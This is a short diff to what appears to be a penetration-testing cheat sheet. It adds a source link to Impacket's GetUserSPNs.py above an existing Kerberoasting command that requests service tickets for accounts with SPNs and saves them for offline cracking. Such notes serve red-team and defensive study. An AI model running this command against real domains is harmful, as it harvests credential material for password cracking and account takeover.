@@ -1,3 +1,6 @@
+# source
+https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py
+
 # get user with SPN set and request tickets (kerberoast)
 python GetUserSPNs.py -request <domain>/<user>:<password> -outputfile <file>
 
